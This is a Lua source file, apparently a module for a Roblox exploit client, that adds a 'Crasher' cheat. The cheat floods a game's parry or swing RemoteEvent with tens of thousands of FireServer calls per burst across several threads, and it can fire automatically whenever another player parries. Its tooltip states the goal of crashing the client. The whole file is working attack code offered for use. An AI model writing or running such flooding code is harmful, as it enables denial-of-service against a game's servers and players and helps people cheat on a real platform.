local Crasher
local Burst
local Delay
local ThreadCount
local RepeatFlood
local ParryTrigger
local running = false
local floodThreads = {}

local function findCombatRemote()
	local events = game:GetService('ReplicatedStorage'):FindFirstChild('GameEvents')
	local combat = events and events:FindFirstChild('CombatRemotes')
	if not combat then
		return nil
	end
	for _, r in ipairs(combat:GetChildren()) do
		if r:IsA('RemoteEvent') and r.Name:lower():find('parry') then
			return r
		end
	end
	return combat:FindFirstChild('Combat_FeintSwing')
end

local function startFlood(remote)
	if running then return end
	running = true
	task.spawn(function()
		local per = math.max(1, math.floor(Burst.Value / ThreadCount.Value))
		while running do
			for i = 1, ThreadCount.Value do
				task.spawn(function()
					for n = 1, per do
						if not running then return end
						remote:FireServer()
					end
				end)
			end
			if not RepeatFlood.Enabled or not running then break end
			task.wait(Delay.Value)
		end
	end)
end

local function stopFlood()
	running = false
	floodThreads = {}
end

local function watchParries()
	local players = game:GetService('Players')
	local checked = {}
	local function bind(plr)
		task.spawn(function()
			local char = plr.Character or plr.CharacterAdded:Wait()
			local humanoid = char:WaitForChild('Humanoid', 10)
			local animator = humanoid and humanoid:FindFirstChild('Animator')
			if not animator or checked[plr] then return end
			checked[plr] = true
			animator.AnimationPlayed:Connect(function(track)
				if not running and ParryTrigger.Enabled then
					local id = tostring(track.Animation.AnimationId):lower()
					local name = tostring(track.Animation.Name):lower()
					if id:find('parry') or name:find('parry') then
						local remote = findCombatRemote()
						if remote then
							startFlood(remote)
						end
					end
				end
			end)
		end)
	end
	parryConn = players.PlayerAdded:Connect(bind)
	for _, plr in ipairs(players:GetPlayers()) do
		bind(plr)
	end
end

Crasher = vape.Categories.Blatant:CreateModule({
	Name = 'Crasher',
	Function = function(callback)
		if callback then
			local remote = findCombatRemote()
			if not remote then
				vape:CreateNotification('Crasher', 'Combat remote not found', 3)
				return
			end
			startFlood(remote)
			watchParries()
		else
			stopFlood()
			if parryConn then
				parryConn:Disconnect()
				parryConn = nil
			end
		end
	end,
	Tooltip = 'Burst-floods the parry remote (fallback: swing) to crash the client.'
})
Burst = Crasher:CreateSlider({
	Name = 'Packets per burst',
	Min = 1000,
	Max = 200000,
	Default = 50000,
	Suffix = ''
})
Delay = Crasher:CreateSlider({
	Name = 'Burst delay (s)',
	Min = 0,
	Max = 10,
	Default = 2,
	Suffix = ''
})
ThreadCount = Crasher:CreateSlider({
	Name = 'Threads',
	Min = 1,
	Max = 16,
	Default = 4
})
RepeatFlood = Crasher:CreateToggle({
	Name = 'Repeat',
	Tooltip = 'Keep bursting until disabled.'
})
ParryTrigger = Crasher:CreateToggle({
	Name = 'Trigger on parry',
	Tooltip = 'Starts the flood when someone plays a parry animation.'
})
